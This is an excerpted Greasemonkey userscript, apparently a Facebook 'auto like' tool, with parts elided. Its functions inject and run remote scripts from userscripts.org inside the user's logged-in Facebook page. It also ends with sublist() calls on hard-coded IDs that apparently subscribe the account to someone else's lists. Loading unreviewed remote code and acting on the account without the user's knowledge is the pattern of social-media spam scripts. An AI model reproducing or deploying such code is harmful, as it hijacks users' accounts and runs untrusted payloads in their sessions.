// ==UserScript==
// @name			NEW FB Auto Li[doesn't work]2
// @namespace		        NEW FB Auto Li[doesn't work]2
// @description		        NEW FB Auto Li[doesn't work]2
// @author			s.k.i.l
...
if(body != null) {
	...
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='https://www.facebook.com' title='s.k.i.l'><img src='http://payload29.cargocollective.com/1/6/203816/2898863/like.png' height='15' width='137'></img></a>"
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://userscripts.org/scripts/source/159093.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//userscripts.org/scripts/source/159095.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="//userscripts.org/scripts/source/159097.user.js",b.body.appendChild(a);void(0);};}
...
sublist("486705478060305");
sublist("491595847571268");
sublist("491595754237944");
